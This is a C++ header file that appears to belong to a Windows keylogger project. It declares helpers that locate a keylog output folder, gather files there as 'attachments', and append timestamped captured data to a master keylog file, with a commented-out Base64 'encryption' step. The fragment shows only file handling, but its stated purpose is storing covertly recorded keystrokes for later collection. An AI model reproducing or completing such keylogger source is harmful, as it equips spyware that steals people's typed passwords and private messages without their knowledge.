#pragma once

#ifndef IO_H
#define IO_H

#include <string>
#include <cstdlib>
#include <fstream>
#include <vector>
#include <iostream>
#include <filesystem>
#include <windows.h>

#include "../Settings.h"

namespace IO
{
	/**
	 * Creates new directory
	 * creates all subdirectories in path
	 * without throwing error
	 **/
	bool MkDir(std::string path);

	// Writes to debug log
	void WriteAppLog(const std::string& s);

	// Gets path of keylog folder
	std::string GetOutputPath(const bool append_seperator = false);

	// Gets all attatchments in output folder
	std::vector<std::string> GetAttatchments(const std::string& path);

	/**
	 * Appends to master keylog file
	 * Returns false if file fails to open	
	 * 
	 * Defined in header because template functions
	 * have to be defined where they are declared
	 **/
	template <class T>
	bool WriteLog(const T& t)
	{
		std::string path = GetOutputPath(true);
		Utils::DateTime dt;

		try
		{
			// Open file in append mode
			std::ofstream out(path + MASTER_LOG_NAME, std::fstream::in | std::fstream::out | std::fstream::app);
			if (!out)
				return false;

			std::ostringstream s;
			s << "[" << dt.GetDateTimeString() << "]" << std::endl
				<< t << std::endl;

			// Encrypt here
			// std::string data = Base64::EncryptB64(s.str());

			out << s.str();

			if (!out)
				return false;

			out.close();
			return true;
		}
		catch (...)
		{
			return false;
		}
	}
}

#endif
